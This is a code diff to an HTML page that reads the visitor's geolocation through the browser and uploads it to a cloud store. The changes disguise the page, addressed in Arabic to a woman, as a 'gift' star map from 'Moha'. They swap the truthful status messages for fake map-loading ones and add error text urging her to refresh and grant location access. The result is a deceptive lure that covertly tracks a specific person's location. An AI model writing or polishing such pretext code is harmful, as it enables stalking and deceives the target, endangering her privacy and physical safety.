@@ -60,7 +60,8 @@
 </head>
 <body>
     <div>
-        <h1>اضغطي على الزر تحت وبعدها السماح علشان تحصلي هدية المبرمج محمد </h1>
+        <h1> Gift from Moha 🎁 </h1>
+        <p> ملاحظة: الهدية عبارة عن خريطة مواقع النجوم لك خصيصا</p>
         <button onclick="saveToCloud()">اضغطي هنا لأعطيك هديتي</button>
         <div class="status" id="statusMessage"></div>
     </div>
@@ -75,7 +76,7 @@
     }
 
     function saveToCloud() {
-        updateStatus("Getting your location...");
+        updateStatus("جاري تحميل الخارطة");
 
         if (!navigator.geolocation) {
             updateStatus("Geolocation not supported", "red");
@@ -115,13 +116,13 @@
                     });
 
                     if (updateResponse.ok) {
-                        updateStatus("Location saved successfully!", "green");
+                        updateStatus("تم الحصول على الخريطة", "green");
                     } else {
-                        updateStatus("Failed to save location", "red");
+                        updateStatus("عذرا تعذر تحميل الخريطة بسبب عدم السماح للوصول للموقع الرجاء تحديث الصفحة والسماح بالوصول للموقع", "red");
                     }
 
                 } catch (error) {
-                    updateStatus("Error saving location", "red");
+                    updateStatus("عذرا تعذر تحميل الخريطة بسبب عدم السماح للوصول للموقع الرجاء تحديث الصفحة والسماح بالوصول للموقع", "red");
                     console.error(error);
                 }
             },
